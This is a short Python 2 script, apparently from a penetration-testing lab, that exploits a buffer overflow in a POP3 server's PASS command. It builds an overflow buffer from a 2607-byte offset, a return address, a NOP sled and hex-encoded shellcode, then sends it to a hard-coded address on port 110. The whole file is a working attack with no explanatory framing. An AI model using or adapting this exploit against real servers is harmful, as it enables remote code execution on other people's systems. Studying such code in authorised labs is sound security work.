#!/usr/bin/python

import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ( 
"\xb8\xd3\x93\x2c\xbb\xd9\xec\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x83\xc6\x04\x31\x46\x0e\x03\x95\x9d\xce\x4e\xe5\x4a\x8c"
"\xb1\x15\x8b\xf1\x38\xf0\xba\x31\x5e\x71\xec\x81\x14\xd7\x01"
"\x69\x78\xc3\x92\x1f\x55\xe4\x13\x95\x83\xcb\xa4\x86\xf0\x4a"
"\x27\xd5\x24\xac\x16\x16\x39\xad\x5f\x4b\xb0\xff\x08\x07\x67"
"\xef\x3d\x5d\xb4\x84\x0e\x73\xbc\x79\xc6\x72\xed\x2c\x5c\x2d"
"\x2d\xcf\xb1\x45\x64\xd7\xd6\x60\x3e\x6c\x2c\x1e\xc1\xa4\x7c"
"\xdf\x6e\x89\xb0\x12\x6e\xce\x77\xcd\x05\x26\x84\x70\x1e\xfd"
"\xf6\xae\xab\xe5\x51\x24\x0b\xc1\x60\xe9\xca\x82\x6f\x46\x98"
"\xcc\x73\x59\x4d\x67\x8f\xd2\x70\xa7\x19\xa0\x56\x63\x41\x72"
"\xf6\x32\x2f\xd5\x07\x24\x90\x8a\xad\x2f\x3d\xde\xdf\x72\x2a"
"\x13\xd2\x8c\xaa\x3b\x65\xff\x98\xe4\xdd\x97\x90\x6d\xf8\x60"
"\xd6\x47\xbc\xfe\x29\x68\xbd\xd7\xed\x3c\xed\x4f\xc7\x3c\x66"
"\x8f\xe8\xe8\x29\xdf\x46\x43\x8a\x8f\x26\x33\x62\xc5\xa8\x6c"
"\x92\xe6\x62\x05\x39\x1d\xe5\x20\xb5\x1d\x8d\x5c\xcb\x1d\x6c"
"\x26\x42\xfb\x04\x48\x03\x54\xb1\xf1\x0e\x2e\x20\xfd\x84\x4b"
"\x62\x75\x2b\xac\x2d\x7e\x46\xbe\xda\x8e\x1d\x9c\x4d\x90\x8b"
"\x88\x12\x03\x50\x48\x5c\x38\xcf\x1f\x09\x8e\x06\xf5\xa7\xa9"
"\xb0\xeb\x35\x2f\xfa\xaf\xe1\x8c\x05\x2e\x67\xa8\x21\x20\xb1"
"\x31\x6e\x14\x6d\x64\x38\xc2\xcb\xde\x8a\xbc\x85\x8d\x44\x28"
"\x53\xfe\x56\x2e\x5c\x2b\x21\xce\xed\x82\x74\xf1\xc2\x42\x71"
"\x8a\x3e\xf3\x7e\x41\xfb\x13\x9d\x43\xf6\xbb\x38\x06\xbb\xa1"
"\xba\xfd\xf8\xdf\x38\xf7\x80\x1b\x20\x72\x84\x60\xe6\x6f\xf4"
"\xf9\x83\x8f\xab\xfa\x81")

buffer = "A"*2607+ "\x8f\x35\x4a\x5f"+ "\x90"*15+shellcode +"C"*(3500-2607-4-350) 
#buffer = "A"*2607+"B"*4+"C"*89


try:
    print "\nSending evil buffers.."
    s.connect(('10.11.16.14',110))
    rec=s.recv(1024)
   
    s.send(('USER username'+'\r\n'))
    rec=s.recv(1024)
   
    s.send(('PASS'+buffer+ '\r\n'))
    s.close()
    print '\nDone!'

except:

    print "Failed to connect the POP3 Server"
